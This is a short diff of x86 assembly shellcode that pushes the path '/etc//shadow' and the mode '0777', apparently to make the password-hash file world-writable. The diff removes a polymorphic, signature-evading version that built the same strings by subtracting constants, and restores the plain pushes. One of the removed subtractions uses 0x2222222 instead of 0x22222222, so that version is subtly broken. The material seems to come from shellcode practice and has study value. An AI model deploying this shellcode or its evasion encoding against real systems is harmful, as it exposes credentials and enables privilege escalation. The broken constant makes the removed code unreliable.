@@ -5,30 +5,9 @@ _start:
 
 	xor eax,eax
 	push eax
-	; old shellcode pushes below
-	; push 0x776f6461
-	; push 0x68732f2f
-	; push 0x6374652f
-
-	; "new" polymorphic shellcode that changes the string values being pushed by subtracting values (0x22222222) from it
-
-	mov esi, 0x99918683
-	sub esi, 0x22222222
-	mov dword [esp-4], esi
-
-	mov esi, 0x8a955151
-	sub esi, 0x22222222
-	mov dword [esp-8], esi
-
-	mov esi, 0x85968751
-	sub esi, 0x2222222
-	mov dword [esp-12], esi
-
-	sub esp, 12
-
-	; end polymorphic shellcode changing the /etc//shadow string	
-
-	mov esi,esp
+	push 0x776f6461
+	push 0x68732f2f
+	push 0x6374652f
 	push eax
 	push 0x37373730
 	mov ebp,esp
